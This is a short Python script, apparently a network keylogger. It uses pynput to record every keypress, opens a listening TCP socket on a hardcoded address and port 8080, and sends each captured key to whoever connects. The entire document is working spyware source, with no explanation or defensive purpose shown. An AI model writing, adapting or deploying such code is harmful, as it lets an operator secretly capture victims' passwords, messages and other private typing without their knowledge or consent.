from pynput.keyboard import Key, Listener
from socket import *

svSocket = socket(AF_INET, SOCK_STREAM)
svSocket.bind(('10.56.210.80', 8080))
svSocket.listen(1)
clientSocket, addr = svSocket.accept()

def on_press(key):
    clientSocket.send(str(key).encode('utf-8'))



with Listener(on_press) as l:
    l.join()
